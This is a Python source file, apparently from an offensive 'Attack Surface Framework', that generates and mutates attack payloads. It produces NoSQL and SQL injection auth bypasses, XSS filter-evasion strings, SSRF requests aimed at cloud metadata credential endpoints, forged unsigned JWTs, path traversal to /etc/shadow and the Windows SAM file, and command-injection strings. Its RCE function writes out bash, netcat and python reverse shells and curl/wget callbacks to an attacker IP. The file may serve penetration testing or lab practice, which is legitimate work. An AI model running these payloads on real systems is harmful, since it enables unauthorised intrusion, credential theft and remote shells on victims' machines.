#!/usr/bin/env python3
"""Dynamic Payload Generator for Attack Surface Framework.

Generates and mutates payloads based on target responses and tech stack.
"""
from __future__ import annotations

import base64
import json
import random
import string
import urllib.parse
from dataclasses import dataclass, field
from typing import Any, Callable


@dataclass
class Payload:
    """Represents a generated payload."""
    name: str
    category: str  # injection, auth_bypass, rce, xss, ssrf, etc.
    raw: str
    encoded_variants: dict[str, str] = field(default_factory=dict)
    metadata: dict[str, Any] = field(default_factory=dict)
    
    def __post_init__(self):
        """Generate encoded variants."""
        self.encoded_variants = {
            "url": urllib.parse.quote(self.raw),
            "double_url": urllib.parse.quote(urllib.parse.quote(self.raw)),
            "base64": base64.b64encode(self.raw.encode()).decode(),
            "hex": self.raw.encode().hex(),
            "unicode": "".join(f"\\u{ord(c):04x}" for c in self.raw),
        }


class PayloadGenerator:
    """Generates exploit payloads based on context."""
    
    def __init__(self):
        self.generated_payloads: list[Payload] = []
        self.mutation_count = 0
        
    def generate_nosql_payloads(self, field_names: list[str] = None) -> list[Payload]:
        """Generate NoSQL injection payloads."""
        field_names = field_names or ["username", "password", "email", "user", "id"]
        payloads = []
        
        # MongoDB operator payloads
        operators = [
            ('$gt', '""'),
            ('$ne', 'null'),
            ('$ne', '""'),
            ('$exists', 'true'),
            ('$regex', '".*"'),
            ('$where', '"1==1"'),
            ('$in', '["admin", "root", "administrator"]'),
            ('$or', '[{"admin": true}]'),
            ('$nin', '["blocked"]'),
        ]
        
        for op, val in operators:
            # Single field injection
            for field in field_names:
                payload_str = f'{{"{field}": {{"{op}": {val}}}}}'
                payloads.append(Payload(
                    name=f"nosql_{op}_{field}",
                    category="nosql_injection",
                    raw=payload_str,
                    metadata={"operator": op, "field": field}
                ))
            
            # Multi-field injection (auth bypass)
            if len(field_names) >= 2:
                payload_str = f'{{"{field_names[0]}": {{"{op}": {val}}}, "{field_names[1]}": {{"{op}": {val}}}}}'
                payloads.append(Payload(
                    name=f"nosql_{op}_multi",
                    category="nosql_injection",
                    raw=payload_str,
                    metadata={"operator": op, "fields": field_names[:2]}
                ))
        
        self.generated_payloads.extend(payloads)
        return payloads
    
    def generate_sql_payloads(self) -> list[Payload]:
        """Generate SQL injection payloads."""
        payloads = []
        
        sqli_patterns = [
            # Auth bypass
            ("auth_bypass_or", "' OR '1'='1"),
            ("auth_bypass_or_comment", "' OR '1'='1'--"),
            ("auth_bypass_or_hash", "' OR '1'='1'#"),
            ("auth_bypass_admin", "admin'--"),
            ("auth_bypass_admin_or", "admin' OR '1'='1"),
            
            # Union based
            ("union_null_1", "' UNION SELECT NULL--"),
            ("union_null_2", "' UNION SELECT NULL,NULL--"),
            ("union_null_3", "' UNION SELECT NULL,NULL,NULL--"),
            ("union_users", "' UNION SELECT username,password FROM users--"),
            ("union_info_schema", "' UNION SELECT table_name,NULL FROM information_schema.tables--"),
            
            # Error based
            ("error_extractvalue", "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--"),
            ("error_updatexml", "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)--"),
            
            # Time based
            ("time_sleep", "' AND SLEEP(5)--"),
            ("time_benchmark", "' AND BENCHMARK(5000000,SHA1('test'))--"),
            ("time_pg_sleep", "'; SELECT pg_sleep(5)--"),
            
            # Boolean based
            ("bool_true", "' AND '1'='1"),
            ("bool_false", "' AND '1'='2"),
            ("bool_substr", "' AND SUBSTRING(@@version,1,1)='5"),
            
            # Stacked queries
            ("stacked_version", "'; SELECT @@version--"),
            ("stacked_user", "'; SELECT user()--"),
        ]
        
        for name, pattern in sqli_patterns:
            payloads.append(Payload(
                name=f"sqli_{name}",
                category="sql_injection",
                raw=pattern,
                metadata={"type": name.split("_")[0]}
            ))
        
        self.generated_payloads.extend(payloads)
        return payloads
    
    def generate_xss_payloads(self) -> list[Payload]:
        """Generate XSS payloads."""
        payloads = []
        
        xss_patterns = [
            # Basic
            ("basic_script", "<script>alert(1)</script>"),
            ("basic_img", "<img src=x onerror=alert(1)>"),
            ("basic_svg", "<svg onload=alert(1)>"),
            ("basic_body", "<body onload=alert(1)>"),
            
            # Attribute escape
            ("attr_dquote", '"><script>alert(1)</script>'),
            ("attr_squote", "'-alert(1)-'"),
            ("attr_event", '" onmouseover="alert(1)'),
            
            # JavaScript context
            ("js_break", "';alert(1);//"),
            ("js_template", "${alert(1)}"),
            ("js_constructor", "{{constructor.constructor('alert(1)')()}}"),
            
            # Filter bypass
            ("bypass_case", "<ScRiPt>alert(1)</sCrIpT>"),
            ("bypass_null", "<scr\\x00ipt>alert(1)</script>"),
            ("bypass_newline", "<script\\x0d\\x0a>alert(1)</script>"),
            ("bypass_entity", "&#60;script&#62;alert(1)&#60;/script&#62;"),
            
            # DOM based
            ("dom_location", "javascript:alert(document.domain)"),
            ("dom_eval", "'-eval(atob('YWxlcnQoMSk='))-'"),
        ]
        
        for name, pattern in xss_patterns:
            payloads.append(Payload(
                name=f"xss_{name}",
                category="xss",
                raw=pattern,
                metadata={"type": name.split("_")[0]}
            ))
        
        self.generated_payloads.extend(payloads)
        return payloads
    
    def generate_ssrf_payloads(self) -> list[Payload]:
        """Generate SSRF payloads."""
        payloads = []
        
        ssrf_targets = [
            # Localhost variants
            ("localhost", "http://localhost"),
            ("127_dot", "http://127.0.0.1"),
            ("127_decimal", "http://2130706433"),  # Decimal IP
            ("127_hex", "http://0x7f000001"),  # Hex IP
            ("127_octal", "http://0177.0.0.1"),  # Octal
            ("ipv6_localhost", "http://[::1]"),
            ("ipv6_mapped", "http://[::ffff:127.0.0.1]"),
            
            # Cloud metadata
            ("aws_meta", "http://169.254.169.254/latest/meta-data/"),
            ("aws_token", "http://169.254.169.254/latest/api/token"),
            ("aws_creds", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
            ("gcp_meta", "http://metadata.google.internal/computeMetadata/v1/"),
            ("azure_meta", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
            ("digital_ocean", "http://169.254.169.254/metadata/v1/"),
            
            # Internal services
            ("internal_80", "http://192.168.1.1"),
            ("internal_8080", "http://192.168.1.1:8080"),
            ("internal_3000", "http://10.0.0.1:3000"),
            
            # Protocol smuggling
            ("gopher_redis", "gopher://127.0.0.1:6379/_INFO"),
            ("dict_redis", "dict://127.0.0.1:6379/INFO"),
            ("file_passwd", "file:///etc/passwd"),
        ]
        
        for name, target in ssrf_targets:
            payloads.append(Payload(
                name=f"ssrf_{name}",
                category="ssrf",
                raw=target,
                metadata={"target_type": name.split("_")[0]}
            ))
        
        self.generated_payloads.extend(payloads)
        return payloads
    
    def generate_rce_payloads(self, attacker_ip: str = "ATTACKER_IP", port: int = 4444) -> list[Payload]:
        """Generate RCE/command injection payloads."""
        payloads = []
        
        # Command separators
        separators = [";", "|", "||", "&&", "\n", "`", "$(", ")"]
        
        # Commands to test
        test_commands = [
            ("id", "id"),
            ("whoami", "whoami"),
            ("uname", "uname -a"),
            ("cat_passwd", "cat /etc/passwd"),
            ("ping", f"ping -c 1 {attacker_ip}"),
            ("curl", f"curl http://{attacker_ip}:{port}/rce_test"),
            ("wget", f"wget http://{attacker_ip}:{port}/rce_test"),
            ("sleep", "sleep 5"),
        ]
        
        for sep in separators:
            for cmd_name, cmd in test_commands:
                if sep == "$(":
                    payload_str = f"$({cmd})"
                elif sep == "`":
                    payload_str = f"`{cmd}`"
                else:
                    payload_str = f"{sep}{cmd}"
                
                payloads.append(Payload(
                    name=f"rce_{cmd_name}_{separators.index(sep)}",
                    category="rce",
                    raw=payload_str,
                    metadata={"separator": sep, "command": cmd}
                ))
        
        # Reverse shells
        reverse_shells = [
            ("bash_tcp", f"bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1"),
            ("bash_b64", f"bash -c 'bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1'"),
            ("nc_mkfifo", f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {attacker_ip} {port} >/tmp/f"),
            ("nc_e", f"nc -e /bin/sh {attacker_ip} {port}"),
            ("python_rev", f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{attacker_ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"),
        ]
        
        for name, shell in reverse_shells:
            payloads.append(Payload(
                name=f"revshell_{name}",
                category="reverse_shell",
                raw=shell,
                metadata={"attacker_ip": attacker_ip, "port": port}
            ))
        
        self.generated_payloads.extend(payloads)
        return payloads
    
    def generate_jwt_payloads(self) -> list[Payload]:
        """Generate JWT manipulation payloads."""
        import json
        payloads = []
        
        # Headers
        headers = [
            {"alg": "none", "typ": "JWT"},
            {"alg": "None", "typ": "JWT"},
            {"alg": "NONE", "typ": "JWT"},
            {"alg": "nOnE", "typ": "JWT"},
            {"alg": "HS256", "typ": "JWT"},  # For key confusion
        ]
        
        # Payload claims
        claims = [
            {"user": "admin", "role": "admin"},
            {"sub": "admin", "role": "superuser"},
            {"username": "admin", "admin": True},
            {"id": 1, "role": "administrator"},
            {"user_id": 1, "is_admin": True},
            {"email": "admin@localhost", "role": "admin"},
        ]
        
        for header in headers:
            for claim in claims:
                header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
                claim_b64 = base64.urlsafe_b64encode(json.dumps(claim).encode()).decode().rstrip("=")
                
                # alg:none has empty signature
                if header.get("alg", "").lower() == "none":
                    token = f"{header_b64}.{claim_b64}."
                else:
                    # For other algs, try empty or weak signatures
                    token = f"{header_b64}.{claim_b64}.signature"
                
                payloads.append(Payload(
                    name=f"jwt_{header['alg']}_{list(claim.keys())[0]}",
                    category="jwt",
                    raw=token,
                    metadata={"header": header, "claims": claim}
                ))
        
        self.generated_payloads.extend(payloads)
        return payloads
    
    def generate_lfi_payloads(self) -> list[Payload]:
        """Generate LFI/Path traversal payloads."""
        payloads = []
        
        # Target files
        targets = [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/proc/self/environ",
            "/proc/self/cmdline",
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
            "C:\\Windows\\System32\\config\\SAM",
            "C:\\Windows\\win.ini",
        ]
        
        # Traversal patterns
        patterns = [
            "../" * 5,
            "..\\",
            "....//",
            "..%2f",
            "%2e%2e%2f",
            "..%252f",
            "%252e%252e%252f",
            "..%c0%af",
            "..%c1%9c",
        ]
        
        for target in targets:
            for pattern in patterns:
                clean_target = target.lstrip("/").lstrip("\\")
                payload_str = f"{pattern}{clean_target}"
                
                payloads.append(Payload(
                    name=f"lfi_{clean_target.replace('/', '_').replace('\\', '_')[:20]}",
                    category="lfi",
                    raw=payload_str,
                    metadata={"target_file": target, "traversal_pattern": pattern}
                ))
        
        self.generated_payloads.extend(payloads)
        return payloads
    
    def mutate_payload(self, payload: Payload, mutations: int = 5) -> list[Payload]:
        """Mutate a payload to create variants."""
        mutated = []
        
        mutation_funcs: list[tuple[str, Callable[[str], str]]] = [
            ("case_swap", lambda s: "".join(c.swapcase() if random.random() > 0.5 else c for c in s)),
            ("add_null", lambda s: s.replace(" ", "\x00 ")),
            ("add_newline", lambda s: s.replace(" ", "\n")),
            ("double_encode", lambda s: urllib.parse.quote(urllib.parse.quote(s))),
            ("unicode_escape", lambda s: "".join(f"\\u{ord(c):04x}" if random.random() > 0.7 else c for c in s)),
            ("concat_split", lambda s: "+".join(s.split(" ")) if " " in s else s),
            ("comment_inject", lambda s: s.replace("'", "'/**/") if "'" in s else s),
        ]
        
        for i in range(min(mutations, len(mutation_funcs))):
            name, func = mutation_funcs[i]
            try:
                mutated_raw = func(payload.raw)
                if mutated_raw != payload.raw:
                    mutated.append(Payload(
                        name=f"{payload.name}_mut_{name}",
                        category=payload.category,
                        raw=mutated_raw,
                        metadata={**payload.metadata, "mutation": name, "original": payload.name}
                    ))
                    self.mutation_count += 1
            except:
                pass
        
        self.generated_payloads.extend(mutated)
        return mutated
    
    def generate_all(self, attacker_ip: str = "ATTACKER_IP", port: int = 4444) -> list[Payload]:
        """Generate all payload types."""
        all_payloads = []
        all_payloads.extend(self.generate_nosql_payloads())
        all_payloads.extend(self.generate_sql_payloads())
        all_payloads.extend(self.generate_xss_payloads())
        all_payloads.extend(self.generate_ssrf_payloads())
        all_payloads.extend(self.generate_rce_payloads(attacker_ip, port))
        all_payloads.extend(self.generate_jwt_payloads())
        all_payloads.extend(self.generate_lfi_payloads())
        return all_payloads
    
    def get_by_category(self, category: str) -> list[Payload]:
        """Get payloads by category."""
        return [p for p in self.generated_payloads if p.category == category]
    
    def export_to_file(self, filepath: str):
        """Export payloads to file."""
        with open(filepath, "w") as f:
            for p in self.generated_payloads:
                f.write(f"# {p.name} ({p.category})\n")
                f.write(f"{p.raw}\n\n")


if __name__ == "__main__":
    import sys
    
    attacker_ip = sys.argv[1] if len(sys.argv) > 1 else "10.10.14.5"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 4444
    
    gen = PayloadGenerator()
    payloads = gen.generate_all(attacker_ip, port)
    
    print(f"Generated {len(payloads)} payloads")
    print("\nCategories:")
    categories = set(p.category for p in payloads)
    for cat in sorted(categories):
        count = len([p for p in payloads if p.category == cat])
        print(f"  {cat}: {count}")
    
    print("\nSample payloads:")
    for cat in sorted(categories):
        sample = next((p for p in payloads if p.category == cat), None)
        if sample:
            print(f"\n[{cat.upper()}] {sample.name}")
            print(f"  Raw: {sample.raw[:80]}...")
